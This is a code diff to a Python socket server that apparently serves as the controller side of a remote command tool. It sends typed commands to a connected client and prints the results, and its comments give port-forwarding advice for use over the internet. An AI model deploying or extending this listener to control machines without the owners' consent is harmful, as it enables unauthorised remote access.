@@ -4,7 +4,9 @@ import os
 import random
 import string
 
-HOST = sys.argv[1] if len(sys.argv) > 1 else '0.0.0.0' # Change 0.0.0.0 to the ip of your device and go into your Router settings to setup port forwarding
+h_name = socket.gethostname()
+ipaddr = socket.gethostbyname(h_name)
+HOST = sys.argv[1] if len(sys.argv) > 1 else ipaddr # Go into your Router settings to setup port forwarding if you want to use it outside of your local network
 PORT = int(sys.argv[2] if len(sys.argv) > 2 else 5555) # Enter this port when asked which port is to be forwarded
 
 s = socket.socket()
@@ -13,14 +15,13 @@ s.bind((HOST, PORT))
 
 s.listen(1)
 
-uname = os.getenv("username")
 while True:
     print(f'[*] listening as {HOST}:{PORT}')
 
     client = s.accept()
-    print(f'[*] client connected {client[1]}')
+    print(f'[*] Client connected {client[1]}')
 
-    client[0].send('welcome'.encode())
+    client[0].send('Welcome'.encode())
     while True:
         cmd = input('>>> ')
         client[0].send(cmd.encode())
@@ -31,7 +32,8 @@ while True:
         # To add your own command remove the # below and change alias with the command alias and command with the command name
         # Make sure to add it to Client.py as well
         # if cmd.lower() in ['alias', 'command']:   
-            # put you code here
+            # output = client[0].recv(1024).decode()
+            # print(f'your text here {output}')
 
         result = client[0].recv(1024).decode()
         print(result)
